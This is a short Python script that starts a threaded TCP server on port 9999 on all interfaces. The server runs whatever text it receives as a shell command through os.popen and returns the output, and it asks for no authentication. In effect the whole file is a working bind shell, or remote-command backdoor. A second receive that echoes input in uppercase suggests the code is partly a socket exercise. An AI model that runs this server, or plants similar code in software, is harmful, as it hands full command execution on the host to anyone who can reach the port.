#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socketserver
import os

class MyTCPHandler(socketserver.BaseRequestHandler):
    def handle (self):
        while 1:
            self.data=self.request.recv(2048)
            h,p=self.client_address
            if not self.data:break
            print("connected from %s:%s" % (h,p))
            cmd=os.popen(self.data.decode('utf-8'))
            result=cmd.read()
            self.request.sendall(result.encode('utf-8'))
            self.data=self.request.recv(2048)
            self.request.sendall(self.data.upper())

if __name__=='__main__':
    HOST,PORT='',9999
    server=socketserver.ThreadingTCPServer((HOST,PORT),MyTCPHandler)

    server.serve_forever()